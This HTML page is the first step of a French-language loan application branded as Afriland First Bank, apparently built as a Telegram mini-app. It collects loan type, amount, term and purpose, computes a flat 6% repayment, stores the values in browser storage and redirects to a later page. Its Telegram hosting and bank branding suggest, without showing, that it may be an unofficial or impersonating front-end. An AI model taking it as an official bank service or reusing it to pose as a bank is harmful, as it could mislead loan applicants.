<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Afriland First Bank - Demande de Prêt</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --purple-primary: #6b21a8; --purple-hover: #581c87; --bg-color: #f3f4f6; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .app-header { width: 100%; background-color: var(--purple-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .back-btn { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); font-size: 18px; font-weight: 800; color: white; }
        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
        .main-title { font-size: 24px; color: #1f2937; margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: #6b7280; text-align: center; margin-bottom: 20px; }
        .step-indicator { display: flex; gap: 8px; margin: 0 auto 28px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e5e7eb; border-radius: 2px; }
        .step-bar.active { background-color: var(--purple-primary); }
        .form-group { margin-bottom: 20px; display: flex; flex-direction: column; }
        .form-group label { font-size: 14px; font-weight: 700; color: #374151; margin-bottom: 8px; }
        .form-control { font-size: 15px; padding: 14px; border: 1px solid #d1d5db; border-radius: 10px; outline: none; width: 100%; }
        .form-control:focus { border-color: var(--purple-primary); }
        textarea.form-control { resize: none; height: 90px; }
        .btn-next { background-color: var(--purple-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #6b7280; margin-top: auto; }
    </style>
</head>
<body>
<div class="app-header">
    <a href="/" class="back-btn">← Retour</a>
    <div class="header-title">Afriland First Bank</div>
    <div style="width:24px"></div>
</div>

<div class="card">
    <h1 class="main-title">Détails du Crédit</h1>
    <div class="subtext">Étape 1 sur 3</div>
    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
        <div class="step-bar"></div>
    </div>

    <form onsubmit="submitStep1(event)">
        <div class="form-group">
            <label for="loanType">Type de Crédit</label>
            <select id="loanType" class="form-control" required>
                <option value="Crédit Personnel" selected>Crédit Personnel</option>
                <option value="Crédit Consommation">Crédit Consommation</option>
                <option value="Crédit Équipement">Crédit Équipement</option>
                <option value="Crédit Scolaire">Crédit Scolaire</option>
            </select>
        </div>
        <div class="form-group">
            <label for="loanAmt">Montant (XAF)</label>
            <input type="number" id="loanAmt" class="form-control" value="250000" required>
        </div>
        <div class="form-group">
            <label for="loanTerm">Durée</label>
            <select id="loanTerm" class="form-control" required>
                <option value="6 Mois">6 Mois</option>
                <option value="12 Mois" selected>12 Mois</option>
                <option value="24 Mois">24 Mois</option>
                <option value="36 Mois">36 Mois</option>
            </select>
        </div>
        <div class="form-group">
            <label for="loanPurpose">Objet du prêt</label>
            <textarea id="loanPurpose" class="form-control" placeholder="Motif de votre demande..." required></textarea>
        </div>
        <button type="submit" class="btn-next">Étape Suivante</button>
    </form>
</div>

<div class="footer-banner">© 2026 Afriland First Bank Cameroun</div>

<script>
    function submitStep1(e) {
        e.preventDefault();
        const amt = document.getElementById('loanAmt').value;
        const term = document.getElementById('loanTerm').value;
        const purpose = document.getElementById('loanPurpose').value;
        const months = Number(term.replace(/\D/g, '')) || 12;

        const monthly = Math.round((Number(amt) * 1.06) / months);

        localStorage.setItem('appliedAmount', amt);
        localStorage.setItem('appliedTerm', term);
        localStorage.setItem('appliedPurpose', purpose);
        localStorage.setItem('monthly_repayment', monthly);

        window.location.href = "/page3";
    }
</script>
</body>
</html>
